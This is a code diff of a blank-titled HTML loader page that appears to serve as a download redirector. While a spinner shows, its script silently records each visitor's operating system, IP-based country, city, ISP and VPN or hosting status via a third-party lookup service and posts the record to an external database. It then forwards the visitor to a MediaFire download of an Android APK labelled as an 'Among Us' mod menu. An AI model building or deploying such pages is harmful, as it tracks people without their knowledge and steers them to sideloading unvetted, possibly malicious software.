@@ -1,12 +1,15 @@
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#090909">
+<meta name="color-scheme" content="dark">
 <title></title>
 
 <style>
-html,body{
+html,
+body{
     margin:0;
     width:100%;
     height:100%;
@@ -22,7 +25,7 @@ body{
 .loader{
     width:20px;
     height:20px;
-    border:2px solid #222;
+    border:2px solid #232323;
     border-top-color:#777;
     border-radius:50%;
     animation:spin .65s linear infinite;
@@ -42,61 +45,61 @@ body{
 
 <script>
 const NAMESPACE="mete-counter-x8k92m412";
+
 const REDIRECT="https://www.mediafire.com/file/zpdvgqnlmlkye70/T_Dev_Among_Us_v2026.8.18_Signed_Menu_v22.apk/file";
+
 const DB=`https://mantledb.sh/v2/${NAMESPACE}`;
 
-async function getOS(){
-    const ua=navigator.userAgent||"";
-    let platform=navigator.platform||"";
+function getOS(){
+    const ua=(navigator.userAgent||"").toLowerCase();
 
-    if(navigator.userAgentData){
-        try{
-            const data=await navigator.userAgentData.getHighEntropyValues([
-                "platform",
-                "mobile",
-                "model"
-            ]);
+    const platform=(
+        navigator.userAgentData?.platform||
+        navigator.platform||
+        ""
+    ).toLowerCase();
 
-            if(data.platform){
-                platform=data.platform;
-            }
-        }catch{}
-    }
-
-    const value=(ua+" "+platform).toLowerCase();
-
-    if(value.includes("android")){
+    if(
+        ua.includes("android")||
+        platform.includes("android")
+    ){
         return "Android";
     }
 
     if(
-        value.includes("iphone")||
-        value.includes("ipad")||
-        value.includes("ipod")
+        ua.includes("iphone")||
+        ua.includes("ipad")||
+        ua.includes("ipod")
     ){
         return "iOS";
     }
 
     if(
-        platform==="MacIntel" &&
+        platform==="macintel" &&
         navigator.maxTouchPoints>1
     ){
         return "iOS";
     }
 
-    if(value.includes("windows")){
+    if(
+        platform.includes("win")||
+        ua.includes("windows")
+    ){
         return "Windows";
     }
 
     if(
-        value.includes("macintosh")||
-        value.includes("mac os")||
-        value.includes("macintel")
+        platform.includes("mac")||
+        ua.includes("macintosh")||
+        ua.includes("mac os x")
     ){
         return "Mac";
     }
 
-    if(value.includes("linux")){
+    if(
+        platform.includes("linux")||
+        ua.includes("linux")
+    ){
         return "Linux";
     }
 
@@ -106,7 +109,7 @@ async function getOS(){
 function getDay(){
     const d=new Date();
 
-    return[
+    return [
         d.getUTCFullYear(),
         String(d.getUTCMonth()+1).padStart(2,"0"),
         String(d.getUTCDate()).padStart(2,"0")
@@ -133,12 +136,12 @@ async function getNetwork(){
 
     const timeout=setTimeout(
         ()=>controller.abort(),
-        1100
+        900
     );
 
     try{
         const response=await fetch(
-            "https://ipsnapshot.com/api/ip/self",
+            "https://hackmyip.com/api/ip",
             {
                 signal:controller.signal,
                 cache:"no-store"
@@ -148,35 +151,43 @@ async function getNetwork(){
         clearTimeout(timeout);
 
         if(!response.ok){
-            throw new Error();
+            throw new Error("Network lookup failed");
         }
 
         const result=await response.json();
+
         const data=result.data||{};
+        const location=data.location||{};
+        const network=data.network||{};
+        const privacy=data.privacy||{};
 
-        let connection="Normal";
+        let connection="Unknown";
 
-        if(data.is_tor===true){
-            connection="Tor";
-        }else if(data.is_vpn===true){
+        if(privacy.is_vpn===true){
             connection="VPN";
-        }else if(data.is_datacenter===true){
+        }
+        else if(privacy.is_datacenter===true){
             connection="Hosting";
+        }
+        else if(privacy.is_residential===true){
+            connection="Normal";
+        }
+        else if(privacy.type){
+            connection=String(privacy.type);
         }
 
         return{
-            country:data.country_code||"XX",
-            countryName:data.country||"Unknown",
-            city:data.city||"Unknown",
-            isp:data.isp||"Unknown",
+            country:location.country||"XX",
+            city:location.city||"Unknown",
+            isp:network.isp||"Unknown",
             connection:connection
         };
-    }catch{
+    }
+    catch{
         clearTimeout(timeout);
 
         return{
             country:"XX",
-            countryName:"Unknown",
             city:"Unknown",
             isp:"Unknown",
             connection:"Unknown"
@@ -185,48 +196,36 @@ async function getNetwork(){
 }
 
 async function saveVisit(){
-    const [network,system]=await Promise.all([
-        getNetwork(),
-        getOS()
-    ]);
+    const network=await getNetwork();
 
     const visit={
         timestamp:Date.now(),
         datetime:getDateTime(),
         country:network.country,
-        countryName:network.countryName,
         city:network.city,
-        os:system,
+        os:getOS(),
         isp:network.isp,
         connection:network.connection
     };
 
-    const id=crypto.randomUUID
-        ?crypto.randomUUID()
-        :`${Date.now()}-${Math.random().toString(36).slice(2)}`;
+    const id=
+        typeof crypto!=="undefined" &&
+        typeof crypto.randomUUID==="function"
+            ?crypto.randomUUID()
+            :`${Date.now()}-${Math.random().toString(36).slice(2)}`;
 
     const data={};
+
     data[id]=visit;
 
-    const endpoint=`${DB}/visits/${getDay()}`;
+    const endpoint=
+        `${DB}/visits/${getDay()}`;
 
-    let response=await fetch(
-        endpoint,
-        {
-            method:"PATCH",
-            headers:{
-                "Content-Type":"application/json"
-            },
-            body:JSON.stringify(data),
-            keepalive:true
-        }
-    );
-
-    if(response.status===404){
-        await fetch(
+    try{
+        const response=await fetch(
             endpoint,
             {
-                method:"POST",
+                method:"PATCH",
                 headers:{
                     "Content-Type":"application/json"
                 },
@@ -234,26 +233,43 @@ async function saveVisit(){
                 keepalive:true
             }
         );
-    }
 
-    await fetch(
-        `https://mantledb.sh/v2/increment/${NAMESPACE}/stats`,
-        {
-            method:"POST",
-            headers:{
-                "Content-Type":"application/json"
-            },
-            body:JSON.stringify({
-                key:"total",
-                by:1
-            }),
-            keepalive:true
+        if(response.status===404){
+            await fetch(
+                endpoint,
+                {
+                    method:"POST",
+                    headers:{
+                        "Content-Type":"application/json"
+                    },
+                    body:JSON.stringify(data),
+                    keepalive:true
+                }
+            );
         }
-    );
+
+        await fetch(
+            `https://mantledb.sh/v2/increment/${NAMESPACE}/stats`,
+            {
+                method:"POST",
+                headers:{
+                    "Content-Type":"application/json"
+                },
+                body:JSON.stringify({
+                    key:"total",
+                    by:1
+                }),
+                keepalive:true
+            }
+        );
+    }
+    catch{}
 }
 
 function wait(ms){
-    return new Promise(resolve=>setTimeout(resolve,ms));
+    return new Promise(
+        resolve=>setTimeout(resolve,ms)
+    );
 }
 
 (async()=>{
@@ -261,16 +277,21 @@ function wait(ms){
 
     await Promise.race([
         saveVisit(),
-        wait(2000)
+        wait(1800)
     ]);
 
-    const elapsed=Date.now()-started;
+    const elapsed=
+        Date.now()-started;
 
     if(elapsed<2000){
-        await wait(2000-elapsed);
+        await wait(
+            2000-elapsed
+        );
     }
 
-    window.location.replace(REDIRECT);
+    window.location.replace(
+        REDIRECT
+    );
 })();
 </script>
 
